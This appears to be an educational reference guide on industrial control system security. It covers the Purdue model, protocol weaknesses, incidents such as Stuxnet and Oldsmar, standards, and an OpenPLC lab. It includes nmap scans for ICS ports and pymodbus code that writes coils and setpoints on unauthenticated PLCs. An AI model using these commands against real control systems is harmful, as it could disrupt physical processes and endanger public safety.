# ICS / OT Security

> Industrial Control Systems, SCADA, PLCs, and Operational Technology security.

---

## What is ICS/OT Security?

**IT security** protects data confidentiality and availability.  
**OT/ICS security** protects physical processes: a breach can trip a power grid, rupture a pipeline, or disable a water treatment plant.

The threat model is different:
- **Availability > Confidentiality**: downtime costs lives, not just money
- Legacy protocols (Modbus, DNP3, EtherNet/IP) were designed with zero authentication
- Air-gapping is a myth in 2024: most OT networks have at least one IT bridge

---

## Architecture

```
Enterprise (IT)
      │
   Firewall / DMZ
      │
   Historian / Jump Server    ← IT/OT boundary
      │
 Level 3: Site Operations (MES, ERP connectors)
      │
 Level 2: Supervisory (SCADA, HMI, Engineering Workstations)
      │
 Level 1: Control (PLCs, RTUs, DCS)
      │
 Level 0: Field Devices (sensors, actuators, motors)
```

**Purdue Model** defines these levels. Real-world networks violate it constantly.

---

## Key Protocols (and their weaknesses)

| Protocol | Port | Used For | Auth | Known Issues |
|----------|------|----------|------|--------------|
| Modbus TCP | 502 | PLCs, sensors | None | No auth, no integrity: replay any command |
| DNP3 | 20000 | SCADA/RTU | Optional (SAv5) | Spoofing, replay; SAv5 rarely deployed |
| EtherNet/IP | 44818 | Rockwell PLCs | None | CIP allows arbitrary ladder-logic upload |
| BACnet | 47808 | Building automation | None | Who-Is flood, read/write objects freely |
| IEC 61850 | 102 | Power substation | TLS optional | MMS unauthenticated in legacy installs |
| Profinet | varies | Siemens factory | None | DCP flooding causes denial of service |
| OPC UA | 4840 | Modern OT data bus | Yes (X.509) | Implementation flaws, cert misconfigs |

---

## Attack Techniques

### Reconnaissance
```bash
# Scan for ICS protocols
nmap -p 502,102,44818,47808,20000,4840 --script modbus-discover <target>
nmap -p 502 --script modbus-enumerate <target>

# Redpoint NSE scripts (ICS-specific)
nmap -sU -p 47808 --script bacnet-info <target>
nmap -p 44818 --script enip-info <target>
```

### Modbus: No Auth, Full R/W
```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient('192.168.1.10', port=502)
c.connect()

# Read holding registers (process values, setpoints)
result = c.read_holding_registers(0, 100, unit=1)
print(result.registers)

# Write a coil: toggle physical output
c.write_coil(0, True, unit=1)   # turns on coil 0

# Force multiple registers: change setpoint
c.write_registers(10, [0xFFFF, 0x0000], unit=1)
```

### EtherNet/IP: CIP Arbitrary Command
```python
from cpppo.server.enip import client

# Read a tag from Allen-Bradley PLC
with client.connector(host='192.168.1.20') as conn:
    for attr, val, idx in conn.read(conn.parse_operations(['PRESSURE_SETPOINT'])):
        print(f'Value: {val}')
```

### DNP3: Replay Attack
DNP3 without Secure Authentication v5: capture legitimate traffic, replay control commands.  
Tools: `aegis`, `scapy-dnp3`

### Historian Pivot (IT → OT)
Historians (OSIsoft PI, Honeywell PHD) sit at the IT/OT boundary.  
Common path: spear-phish engineer → engineer WS → historian → SCADA pivot.

---

## Tools

| Tool | Purpose |
|------|---------|
| [Metasploit ICS modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/gather) | Modbus/EtherNet-IP scanners |
| [PLCScan](https://github.com/meeas/plcscan) | PLC fingerprinting via Modbus & S7 |
| [GRASSMARLIN](https://github.com/nsacyber/GRASSMARLIN) | NSA passive ICS network mapping |
| [Aegis](https://www.digitalbond.com/tools/aegis/) | DNP3 fuzzer |
| [pymodbus](https://github.com/pymodbus-dev/pymodbus) | Python Modbus library |
| [ISF](https://github.com/w3h/isf) | ICS Exploitation Framework |
| [Shodan](https://www.shodan.io/search?query=port%3A502) | Find internet-exposed ICS |

---

## Notable ICS Incidents

| Incident | Year | Impact |
|----------|------|--------|
| Stuxnet | 2010 | Destroyed ~1000 Iranian uranium centrifuges via Siemens S7 PLCs |
| Ukraine Power Grid | 2015/2016 | BlackEnergy/Industroyer: 230k customers lost power |
| Triton/TRISIS | 2017 | Targeted Schneider Triconex safety systems: designed to cause physical destruction |
| Oldsmar Water Plant | 2021 | Attacker increased sodium hydroxide to 111× safe level via TeamViewer |
| Colonial Pipeline | 2021 | IT ransomware → OT shutdown out of caution; US East Coast fuel crisis |

---

## Frameworks & Standards

- **NIST SP 800-82**: Guide to ICS Security
- **IEC 62443**: Industrial automation security standard (zones + conduits model)
- **NERC CIP**: Critical Infrastructure Protection for electric utilities
- **MITRE ATT&CK for ICS**: TTP matrix specific to OT: `attack.mitre.org/matrices/ics/`

---

## Lab Setup (no physical hardware needed)

```bash
# OpenPLC: software PLC, runs Modbus
docker run -it -p 502:502 -p 8080:8080 openplcproject/openplc

# ScadaBR: open source SCADA/HMI
# GNS3 with ICS device images

# Packet captures of real ICS traffic
# https://github.com/automayt/ICS-pcap
```

---

## Learning Path

1. Understand Purdue Model and IT/OT differences
2. Lab: OpenPLC + pymodbus: read/write registers
3. Read: CISA ICS advisories (`cisa.gov/ics-advisories`)
4. Study: Stuxnet reverse engineering (Langner's analysis)
5. CTF: [CSAW ICS Security Challenge], [S4 ICS Security Conference CTFs]
6. Cert: GICSP (GIAC ICS Security), CSSA (Certified SCADA Security Architect)
